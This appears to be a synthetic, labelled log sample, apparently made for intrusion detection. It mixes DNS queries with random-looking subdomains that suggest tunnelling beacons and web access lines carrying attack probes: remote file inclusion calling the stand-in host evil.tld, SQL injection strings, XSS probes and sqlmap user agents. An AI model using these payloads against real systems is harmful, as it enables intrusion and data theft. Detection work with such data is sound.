+Aug 21 10:14:43 dns01 named[222]: client 117.205.125.70#53: query: ayltwtf57l3st866fbmdsfmjmrxs6lertsyu3.internal.svc IN A + (127.0.0.1)hit
+114.67.145.119 - - [21/Aug/2025:10:14:43 +0000] "HEAD /?id=1 HTTP/1.1" 500 3742 "-" "Mozilla/5.0 (X11; Linux x86_64)"hit
+Aug 21 10:14:43 dns01 named[222]: client 53.14.47.249#53: query: gbn7sp7hjfr6g6lx8sooycbmob9a4auj.github.com IN A + (127.0.0.1)hit
+162.33.6.211 - - [21/Aug/2025:10:14:44 +0000] "POST /search?q=file=http://evil.tld/shell.txt HTTP/1.1" 302 1158 "-" "sqlmap/1.7.10"hit
+Aug 21 10:14:44 dns01 named[222]: client 106.162.187.9#53: query: gz3gacrwhqbxld7a50e4llvn35yi8yqtq5oh8h7iv.internal.svc IN A + (127.0.0.1)hit
+Aug 21 10:14:44 dns01 named[222]: client 63.27.9.251#53: query: ce8om9ltst2m0ppf6z7crsw1ybi5b.corp.local IN A + (127.0.0.1)hit
+Aug 21 10:14:44 dns01 named[222]: client 118.13.167.243#53: query: 6g9q9pv7yuhxpr7wxyu0hrps4c6s84e9k27k.internal.svc IN A + (127.0.0.1)hit
+Aug 21 10:14:44 dns01 named[222]: client 208.212.191.232#53: query: hirnfams2hlzifwoptext.example.com IN A + (127.0.0.1)hit
+Aug 21 10:14:45 dns01 named[222]: client 87.136.101.149#53: query: o210q8z6yfr5swxr3sw1sric6qd.updates.microsoft.com IN A + (127.0.0.1)hit
+Aug 21 10:14:45 dns01 named[222]: client 159.208.175.20#53: query: xbic07iapeyw4g0aax37quicej.corp.local IN A + (127.0.0.1)hit
+149.161.174.44 - - [21/Aug/2025:10:14:46 +0000] "HEAD / HTTP/1.1" 200 393 "-" "Go-http-client/1.1"hit
+Aug 21 10:14:47 dns01 named[222]: client 113.186.133.224#53: query: eugu833dm4r97a5qt3kbqkek3b8krkh.github.com IN A + (127.0.0.1)hit
+Aug 21 10:14:47 dns01 named[222]: client 169.82.9.126#53: query: xmdotxjag0xi20mt3thrwf1454s8wiu.github.com IN A + (127.0.0.1)hit
+77.87.103.196 - - [21/Aug/2025:10:14:47 +0000] "HEAD /index.php HTTP/1.1" 403 180 "-" "sqlmap/1.7.10"hit
+Aug 21 10:14:48 dns01 named[222]: client 54.125.60.208#53: query: pdhvi2aw67ncmvletk8um218ge2azfi7ymupp.corp.local IN A + (127.0.0.1)hit
+Aug 21 10:14:48 dns01 named[222]: client 154.188.31.147#53: query: cgy3v55qo0npb201kfye6tm3qnilvbqiwdfxli34a3nkw.corp.local IN A + (127.0.0.1)hit
+Aug 21 10:14:49 dns01 named[222]: client 220.141.244.144#53: query: pnb0gu7fz3nd8g8mtrb4lu1.internal.svc IN A + (127.0.0.1)hit
+Aug 21 10:14:49 dns01 named[222]: client 173.116.72.243#53: query: 7kycci2rbc9106wldvkm7reejny7mnq8lw8av2ao35.example.com IN A + (127.0.0.1)hit
+139.31.218.17 - - [21/Aug/2025:10:14:49 +0000] "POST /index.php?q=onerror=alert(1) HTTP/1.1" 404 1693 "https://corp.local/index.php" "curl/8.0.1"hit
+Aug 21 10:14:50 dns01 named[222]: client 221.190.116.155#53: query: urn0zxits83gtybt1yce5hbyi3k36fyi.example.com IN A + (127.0.0.1)hit
+Aug 21 10:14:51 dns01 named[222]: client 105.166.130.236#53: query: akbrvd1ghpn2l05r88y6nji2wiwvk3vi2l41m.updates.microsoft.com IN A + (127.0.0.1)hit
+Aug 21 10:14:51 dns01 named[222]: client 2.58.102.218#53: query: 6w044ogtugcf8tffr3vcke2zsjm.updates.microsoft.com IN A + (127.0.0.1)hit
+Aug 21 10:14:52 dns01 named[222]: client 111.54.45.182#53: query: hrouwg7waitx5mxbx4s9uxyolis2vooq4y1.internal.svc IN A + (127.0.0.1)hit
+Aug 21 10:14:52 dns01 named[222]: client 144.50.54.93#53: query: k81bysjju8rkixe50a00256ueyvm4lnahytjqzicj.updates.microsoft.com IN A + (127.0.0.1)hit
+Aug 21 10:14:55 dns01 named[222]: client 126.225.188.135#53: query: qvyf5zh4o6jfu2pzfm9xdmab8qvh4bpw9eet8.example.com IN A + (127.0.0.1)hit
+Aug 21 10:14:56 dns01 named[222]: client 215.79.73.222#53: query: 1u0k01qdpnkxo5861engv1t51x15eh2obdkbw9keznryg.corp.local IN A + (127.0.0.1)hit
+Aug 21 10:14:56 dns01 named[222]: client 14.193.225.87#53: query: 0surnjpaptdskc25im7ljn1uf76ib9utf5rjtc5klerp.example.com IN A + (127.0.0.1)hit
+Aug 21 10:14:56 dns01 named[222]: client 68.63.239.176#53: query: rnda0vv4ifv8mvc82apw8nt9wv5u5tdh5yh.github.com IN A + (127.0.0.1)hit
+Aug 21 10:14:56 dns01 named[222]: client 85.244.2.223#53: query: eje3ne5n7hcn9s07ocmt62ejn9kowl31m65lt5xbpjv3.updates.microsoft.com IN A + (127.0.0.1)hit
+107.25.94.67 - - [21/Aug/2025:10:14:57 +0000] "HEAD /wp-login.php HTTP/1.1" 200 587 "-" "sqlmap/1.7.10"hit
+65.46.6.253 - - [21/Aug/2025:10:14:57 +0000] "POST /api/v1/items?q=' OR '1'='1 HTTP/1.1" 403 3373 "-" "sqlmap/1.7.10"hit
+Aug 21 10:14:58 dns01 named[222]: client 139.223.139.60#53: query: 05nrkotc2njfixii6ha6iggusc988cacrm.example.com IN A + (127.0.0.1)hit
+Aug 21 10:14:59 dns01 named[222]: client 24.146.167.116#53: query: 7l8pz2bb3sxet3a6yhf862x2zqeuqrwka9zpyc8f.updates.microsoft.com IN A + (127.0.0.1)hit
+Aug 21 10:15:00 dns01 named[222]: client 17.174.26.119#53: query: 7kaa5dcs14h47tkazkkctqtn7jr20408lpu.github.com IN A + (127.0.0.1)hit
+Aug 21 10:15:01 dns01 named[222]: client 139.18.187.40#53: query: 4vov8f96t1rt9oq8ywu9fsfqojbwrmhtvcmcb.github.com IN A + (127.0.0.1)hit
+133.215.184.211 - - [21/Aug/2025:10:15:01 +0000] "HEAD /search HTTP/1.1" 200 3585 "https://example.com/api/v1/items" "Go-http-client/1.1"hit
+Aug 21 10:15:01 dns01 named[222]: client 119.179.104.21#53: query: 6dmunsabtgjnv7c59l4s0t2eo.updates.microsoft.com IN A + (127.0.0.1)hit
+Aug 21 10:15:01 dns01 named[222]: client 151.249.182.8#53: query: z729qcwbs59vr03c0dszla4i6wk898sinocq81expr.github.com IN A + (127.0.0.1)hit
+Aug 21 10:15:02 dns01 named[222]: client 12.90.127.9#53: query: 0ememl90dj7jchp6brcyem5l63zh3k2lm.corp.local IN A + (127.0.0.1)hit
+Aug 21 10:15:02 dns01 named[222]: client 152.8.168.226#53: query: tjuug6m59oq1icsm20cxaa5ovf.corp.local IN A + (127.0.0.1)hit
+Aug 21 10:15:02 dns01 named[222]: client 35.29.182.116#53: query: b76al4kkvp95k73hrwdwesw.example.com IN A + (127.0.0.1)hit
+Aug 21 10:15:02 dns01 named[222]: client 222.158.106.128#53: query: etdwtzvo02q39e7d9n2tw2ww6ogx7gn.github.com IN A + (127.0.0.1)hit
+Aug 21 10:15:03 dns01 named[222]: client 204.226.35.67#53: query: sgra04dud8pwiti7x7aeuznjatq9775lhcy.example.com IN A + (127.0.0.1)hit
+216.139.88.48 - - [21/Aug/2025:10:15:04 +0000] "POST /login?q=onerror=alert(1) HTTP/1.1" 302 2261 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"hit
+Aug 21 10:15:04 dns01 named[222]: client 220.198.15.140#53: query: xfow8bjz89zodfxck2cj7pydq0afzneuj.github.com IN A + (127.0.0.1)hit
+Aug 21 10:15:04 dns01 named[222]: client 114.184.246.143#53: query: qdc77jyyg8up0u3fs7s3.corp.local IN A + (127.0.0.1)hit
+183.185.61.150 - - [21/Aug/2025:10:15:04 +0000] "HEAD /search HTTP/1.1" 200 320 "-" "sqlmap/1.7.10"hit
+Aug 21 10:15:05 dns01 named[222]: client 36.3.106.114#53: query: kcyyjz1nznhi84jps9fdn4o3anoh8kr6gjyi60ojbbw.internal.svc IN A + (127.0.0.1)hit
+Aug 21 10:15:06 dns01 named[222]: client 177.139.111.24#53: query: azs83tmcbrxpegvfzsegp6mohbovjpaki2ufsoty.internal.svc IN A + (127.0.0.1)hit
+Aug 21 10:15:06 dns01 named[222]: client 135.88.165.81#53: query: 2yfy113n5o1lb4t5najrjfwrz3rx.internal.svc IN A + (127.0.0.1)hit
+Aug 21 10:15:07 dns01 named[222]: client 177.11.31.134#53: query: lu0akk5bf8uamd3tde4444wx8th9hhfexnbqjmk5vlbs3.example.com IN A + (127.0.0.1)hit
+Aug 21 10:15:07 dns01 named[222]: client 18.229.204.162#53: query: oyyhvjof8068pyxzf3u0aeyn2manj1tk3p0lz.updates.microsoft.com IN A + (127.0.0.1)hit
+207.246.48.82 - - [21/Aug/2025:10:15:08 +0000] "POST /?q=onerror=alert(1) HTTP/1.1" 404 476 "-" "Mozilla/5.0 (X11; Linux x86_64)"hit
+93.108.218.96 - - [21/Aug/2025:10:15:08 +0000] "HEAD /?id=1 HTTP/1.1" 200 1688 "https://cdn.example.net/wp-login.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"hit
+Aug 21 10:15:09 dns01 named[222]: client 41.205.225.237#53: query: oy8k8fm0rn5rjs5pd82s8x7ogdp.internal.svc IN A + (127.0.0.1)hit
+Aug 21 10:15:09 dns01 named[222]: client 209.253.132.115#53: query: 52lcrdwzpexfy4k5zwy1kc44oo0fwz37u2fmjfi.example.com IN A + (127.0.0.1)hit
+Aug 21 10:15:10 dns01 named[222]: client 93.92.117.150#53: query: wszdix9nw6u6jiv9baja3uvy6s0e8zcmf.corp.local IN A + (127.0.0.1)hit
+Aug 21 10:15:10 dns01 named[222]: client 189.62.191.242#53: query: w8csqv0nii8rktizsflj2yk3739rs.updates.microsoft.com IN A + (127.0.0.1)hit
+112.186.166.185 - - [21/Aug/2025:10:15:10 +0000] "HEAD /api/v1/items HTTP/1.1" 500 329 "-" "curl/8.0.1"hit
+Aug 21 10:15:11 dns01 named[222]: client 136.59.157.90#53: query: map3xzyv1mvyzc1h4jjm1utk1fltun02shtaj.example.com IN A + (127.0.0.1)hit
+Aug 21 10:15:11 dns01 named[222]: client 59.135.6.226#53: query: 7glf2xm3sm6cnsqk45pkkhruu.updates.microsoft.com IN A + (127.0.0.1)hit
+Aug 21 10:15:11 dns01 named[222]: client 28.218.4.252#53: query: mukkbgzmquo7t1ajwmsb5.corp.local IN A + (127.0.0.1)hit
+Aug 21 10:15:12 dns01 named[222]: client 43.243.97.115#53: query: 5dyohp6twkxcgs8ohgf94ujat1agsc.example.com IN A + (127.0.0.1)hit
+133.10.85.224 - - [21/Aug/2025:10:15:13 +0000] "POST /search?q=file=http://evil.tld/shell.txt HTTP/1.1" 200 1532 "-" "Wget/1.21.4"hit
+Aug 21 10:15:13 dns01 named[222]: client 180.231.25.251#53: query: lkavibjr7e80yfqajdn370cg.internal.svc IN A + (127.0.0.1)hit
+Aug 21 10:15:14 dns01 named[222]: client 216.228.198.14#53: query: r57by0oll0bzrwv42ehtozwql.corp.local IN A + (127.0.0.1)hit
+Aug 21 10:15:14 dns01 named[222]: client 174.225.133.236#53: query: c4un1fibthuhtidet3hq2w5nxk3nib109kzm.updates.microsoft.com IN A + (127.0.0.1)hit
+Aug 21 10:15:14 dns01 named[222]: client 208.83.244.217#53: query: 9t53h25i24d8c9yozlf5ubuxpegao91cjq15ibbztbf.github.com IN A + (127.0.0.1)hit
+205.15.225.13 - - [21/Aug/2025:10:15:16 +0000] "HEAD /wp-login.php HTTP/1.1" 302 279 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"hit
+Aug 21 10:15:16 dns01 named[222]: client 184.101.189.16#53: query: hy49jsyib7tiops2upnosd1yjt5x6o1rgksj96tl9b8c5.example.com IN A + (127.0.0.1)hit
+Aug 21 10:15:17 dns01 named[222]: client 80.26.199.128#53: query: 082n4uxqfssbax0h10xh1qs3mcpgq.github.com IN A + (127.0.0.1)hit
+Aug 21 10:15:18 dns01 named[222]: client 159.102.183.86#53: query: n3ihi563h499ku738b25o3mmswhprdj68iv.updates.microsoft.com IN A + (127.0.0.1)hit
+Aug 21 10:15:18 dns01 named[222]: client 104.231.84.14#53: query: j9m2o3z2134p0hhvs2gi4gst63chyi7uijn.example.com IN A + (127.0.0.1)hit
+Aug 21 10:15:19 dns01 named[222]: client 152.13.209.159#53: query: f4m4vtulqpydm2cjsjx8kjwld5s6524.updates.microsoft.com IN A + (127.0.0.1)hit
+Aug 21 10:15:19 dns01 named[222]: client 93.44.120.173#53: query: iw75p1eikuugxtnmkx4nyzrv5wgfg9is.internal.svc IN A + (127.0.0.1)hit
+2.230.79.55 - - [21/Aug/2025:10:15:19 +0000] "POST /admin?q=file=http://evil.tld/shell.txt HTTP/1.1" 200 3106 "https://corp.local/admin" "curl/8.0.1"hit
+Aug 21 10:15:19 dns01 named[222]: client 1.83.223.87#53: query: yte6cmofma0v0scdjt7mi74two6s5.corp.local IN A + (127.0.0.1)hit
+34.234.148.27 - - [21/Aug/2025:10:15:19 +0000] "HEAD /?id=1 HTTP/1.1" 403 2775 "-" "curl/8.0.1"hit
+Aug 21 10:15:20 dns01 named[222]: client 62.235.86.229#53: query: ds9ladrh4b3nue91keq79moj3.example.com IN A + (127.0.0.1)hit
+9.235.113.172 - - [21/Aug/2025:10:15:21 +0000] "POST /?q=' OR '1'='1 HTTP/1.1" 302 1642 "https://updates.microsoft.com/admin" "sqlmap/1.7.10"hit
+Aug 21 10:15:21 dns01 named[222]: client 34.170.202.182#53: query: xdltzetner4yv2t34y5rj7zv1vmmrxcotu.corp.local IN A + (127.0.0.1)hit
+33.196.26.248 - - [21/Aug/2025:10:15:22 +0000] "HEAD /admin HTTP/1.1" 200 3343 "-" "curl/8.0.1"hit
+Aug 21 10:15:22 dns01 named[222]: client 97.32.48.158#53: query: pkegegpfbomy4bo1qjbuuffg4ati9ilno7vay9.github.com IN A + (127.0.0.1)hit
+79.43.189.89 - - [21/Aug/2025:10:15:22 +0000] "HEAD /login HTTP/1.1" 404 2884 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"hit
+Aug 21 10:15:23 dns01 named[222]: client 64.173.253.252#53: query: arpq1xr3wikka7iionewv7lgp80kqg.updates.microsoft.com IN A + (127.0.0.1)hit
+Aug 21 10:15:23 dns01 named[222]: client 203.163.90.42#53: query: npnbw1beuwhqad6gtju7i093q1e4g.updates.microsoft.com IN A + (127.0.0.1)hit
+215.9.218.91 - - [21/Aug/2025:10:15:24 +0000] "POST /admin?q=' OR '1'='1 HTTP/1.1" 403 2769 "-" "sqlmap/1.7.10"hit
+Aug 21 10:15:24 dns01 named[222]: client 45.157.153.182#53: query: 2mo09n02lc4ma7n1y9df32cfohkfyn38gsgfk7w1.corp.local IN A + (127.0.0.1)hit
+Aug 21 10:15:24 dns01 named[222]: client 159.48.221.25#53: query: orm1qbyg5faqb4la1axplhokg.updates.microsoft.com IN A + (127.0.0.1)hit
+Aug 21 10:15:24 dns01 named[222]: client 156.1.85.202#53: query: v7lo50peor1ac2dm77gvtgb7ai7.internal.svc IN A + (127.0.0.1)hit
+76.176.147.89 - - [21/Aug/2025:10:15:26 +0000] "POST /index.php?q=onerror=alert(1) HTTP/1.1" 403 884 "-" "sqlmap/1.7.10"hit
+Aug 21 10:15:26 dns01 named[222]: client 72.188.141.54#53: query: 6kip1ovjos3q2ph6khaw99mv37nf2fb4gfg46ytn513u.example.com IN A + (127.0.0.1)hit
+Aug 21 10:15:26 dns01 named[222]: client 187.132.235.82#53: query: ja3mkhs3accrkpkz6670lpm2yknd3brg0ny5nabnl0p.github.com IN A + (127.0.0.1)hit
+Aug 21 10:15:46 dns01 named[222]: client 203.22.117.24#53: query: t4a4jjgny6aitpwqpj427ja111xwlrthtr.internal.svc IN A + (127.0.0.1)hit
+Aug 21 10:15:47 dns01 named[222]: client 29.246.156.196#53: query: jxl09t7gafytf86l9miarvwz3.example.com IN A + (127.0.0.1)hit
+Aug 21 10:15:47 dns01 named[222]: client 186.229.187.20#53: query: r9klukfdemv7rbb8az11h3e2bbqvkjggzd7asfjd.corp.local IN A + (127.0.0.1)hit
+Aug 21 10:15:47 dns01 named[222]: client 94.99.139.138#53: query: i02rc9hxskg81kmtgbrynxe8rkgruosy7jcm.example.com IN A + (127.0.0.1)hit
+34.140.157.169 - - [21/Aug/2025:10:15:48 +0000] "HEAD /login HTTP/1.1" 200 1931 "-" "Mozilla/5.0 (X11; Linux x86_64)"hit
+90.10.218.178 - - [21/Aug/2025:10:15:48 +0000] "POST /?id=1&q=onerror=alert(1) HTTP/1.1" 302 2763 "https://example.com/admin" "Go-http-client/1.1"hit
+Aug 21 10:15:49 dns01 named[222]: client 168.171.117.105#53: query: ot7wuqe0guooxag99vpwaz5yw69co.corp.local IN A + (127.0.0.1)hit
+Aug 21 10:15:49 dns01 named[222]: client 114.45.25.236#53: query: imo42wlrm0aeoi2dv26dkvjckupcvae7urib4cv1.updates.microsoft.com IN A + (127.0.0.1)hit
+Aug 21 10:15:49 dns01 named[222]: client 155.204.79.113#53: query: 8e0tzmuap7o2b1cgdtvymq3f2e135mbmmb.corp.local IN A + (127.0.0.1)hit
+Aug 21 10:15:49 dns01 named[222]: client 83.118.64.230#53: query: sc2jzqp6rhx3dzpavjx0kp53.updates.microsoft.com IN A + (127.0.0.1)hit
+Aug 21 10:15:50 dns01 named[222]: client 183.247.242.162#53: query: 6vmsj30yq747z3lbk0i5.github.com IN A + (127.0.0.1)hit
+Aug 21 10:15:51 dns01 named[222]: client 206.225.162.55#53: query: 46kzrkyt8jpi2fpp9sxufjyuaem3r6ovq0k50.updates.microsoft.com IN A + (127.0.0.1)hit
+Aug 21 10:15:51 dns01 named[222]: client 56.156.153.141#53: query: 863e899v9p201rvhorym3fglw.corp.local IN A + (127.0.0.1)hit
+Aug 21 10:15:51 dns01 named[222]: client 148.166.139.62#53: query: pxkuhidqtf1urze090s8aclb4gbhp8f7ii9i7uw7x6vyf.github.com IN A + (127.0.0.1)hit
+112.254.78.200 - - [21/Aug/2025:10:15:51 +0000] "HEAD / HTTP/1.1" 200 3294 "-" "sqlmap/1.7.10"hit
+Aug 21 10:15:53 dns01 named[222]: client 107.86.242.213#53: query: mdkwyqof470ysr6wkri046ii2zljq4w.corp.local IN A + (127.0.0.1)hit
+Aug 21 10:15:54 dns01 named[222]: client 72.14.202.86#53: query: 6v6u6sh0fclfw3n3yfwq1lnfth5fem2v4eeevd5qadzl9.internal.svc IN A + (127.0.0.1)hit
+Aug 21 10:15:55 dns01 named[222]: client 46.64.180.210#53: query: dh0omty2t0hgjinn8vim7vyoampfinrn9t.internal.svc IN A + (127.0.0.1)hit
+Aug 21 10:15:55 dns01 named[222]: client 206.69.161.41#53: query: p5qq08lh2al1y43hrg3o.github.com IN A + (127.0.0.1)hit
+36.236.34.207 - - [21/Aug/2025:10:15:55 +0000] "POST /index.php?q=' OR '1'='1 HTTP/1.1" 404 443 "-" "sqlmap/1.7.10"hit
+Aug 21 10:15:56 dns01 named[222]: client 115.65.21.8#53: query: 7uzo0m1ts44356edh223n.example.com IN A + (127.0.0.1)hit
+139.121.99.157 - - [21/Aug/2025:10:15:56 +0000] "HEAD /api/v1/items HTTP/1.1" 302 2653 "-" "curl/8.0.1"hit
